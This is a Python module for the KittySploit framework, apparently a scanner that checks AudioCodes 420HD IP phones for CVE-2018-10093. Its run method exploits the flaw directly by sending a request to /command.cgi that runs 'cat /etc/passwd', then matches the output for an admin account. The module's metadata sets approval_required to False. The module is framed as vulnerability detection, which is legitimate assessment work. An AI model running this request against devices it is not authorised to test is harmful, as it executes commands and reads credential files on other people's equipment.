#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""AudioCodes IP phone 420HD devices using firmware version 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'AudioCodes 420HD - Remote Code Execution Detection',
        'description': 'AudioCodes IP phone 420HD devices using firmware version 2.2.12.126 allow remote code execution.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'rce', 'iot', 'audiocode', 'edb', 'seclists', 'audiocodes', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/46164',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-10093',
            'https://www.exploit-db.com/exploits/46164/',
            'http://seclists.org/fulldisclosure/2019/Jan/38',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-10093',
    }

    def run(self):
        r = self.http_request(method="GET", path='/command.cgi?cat%20/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('admin:.*:*sh$',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="AudioCodes 420HD - Remote Code Execution detected",
                path='/command.cgi?cat%20/etc/passwd',
            )
            return True
        return False

